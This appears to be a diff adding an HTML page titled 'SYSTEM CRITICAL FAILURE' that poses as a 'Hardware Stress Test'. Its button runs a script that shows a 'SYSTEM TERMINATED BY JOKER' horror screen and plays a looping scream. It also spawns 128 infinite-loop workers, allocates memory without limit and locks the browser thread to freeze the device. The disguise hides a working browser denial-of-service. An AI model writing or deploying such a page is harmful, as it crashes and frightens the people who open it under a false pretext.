@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM CRITICAL FAILURE</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            overflow: hidden; 
+            text-align: center;
+            user-select: none;
+        }
+        /* Horror Overlay */
+        #horror-overlay { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center; 
+            background-size: cover; 
+            z-index: 9999; 
+        }
+        .glitch {
+            font-size: 8vw;
+            font-weight: 900;
+            color: white;
+            text-shadow: 0 0 20px red;
+            margin-top: 35vh;
+            animation: shake 0.1s infinite;
+        }
+        /* Setup Box */
+        .container { margin-top: 25vh; border: 4px solid #ff0000; display: inline-block; padding: 40px; background: rgba(20,0,0,0.9); box-shadow: 0 0 50px #ff0000; border-radius: 20px; }
+        h1 { font-size: 2.5em; text-transform: uppercase; letter-spacing: 5px; }
+        button { 
+            background: #ff0000; 
+            color: #fff; 
+            border: none; 
+            padding: 20px 50px; 
+            font-size: 24px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            border-radius: 10px; 
+            box-shadow: 0 0 20px #fff;
+            transition: 0.2s;
+        }
+        button:active { transform: scale(0.9); box-shadow: none; }
+        @keyframes shake {
+            0% { transform: translate(0); }
+            25% { transform: translate(5px, 5px); }
+            50% { transform: translate(-5px, -5px); }
+            75% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div id="horror-overlay">
+    <div class="glitch">SYSTEM TERMINATED<br>BY JOKER</div>
+</div>
+
+<div id="main-ui" class="container">
+    <h1>Hardware Stress Test</h1>
+    <p>Target: Octa-Core CPU / 16GB RAM</p>
+    <p style="color: yellow;">Status: High Intensity Mode Ready</p>
+    <button onclick="launchAttack()">EXECUTE PROTOCOL</button>
+</div>
+
+<script>
+    function launchAttack() {
+        // 1. Activate Visuals and Audio
+        document.getElementById('horror-overlay').style.display = 'block';
+        document.getElementById('main-ui').style.display = 'none';
+        
+        let scream = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        scream.loop = true;
+        scream.play().catch(e => console.log("Audio play blocked"));
+
+        // 2. CPU Multi-Thread Overload (128 Workers)
+        const workerBlob = new Blob([
+            "onmessage = function() { while(true) { Math.sqrt(Math.random() * 1234567) * Math.atan(Math.random()); } }"
+        ], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(workerBlob);
+
+        for (let i = 0; i < 128; i++) {
+            new Worker(workerUrl).postMessage("start");
+        }
+
+        // 3. RAM Massive Injection (Targeting 16GB)
+        let memoryVault = [];
+        setInterval(() => {
+            try {
+                for (let i = 0; i < 1000; i++) {
+                    // Constant allocation of large 64-bit arrays
+                    memoryVault.push(new BigInt64Array(1000000).fill(999n));
+                }
+            } catch (e) {
+                console.warn("Buffer Overflow");
+            }
+        }, 25);
+
+        // 4. Thread Lock (Freeze Screen)
+        setTimeout(() => {
+            while(true) {
+                window.scrollBy(0, Math.random() * 100);
+                console.error("KERNEL_PANIC_0x000FF");
+            }
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
+
+
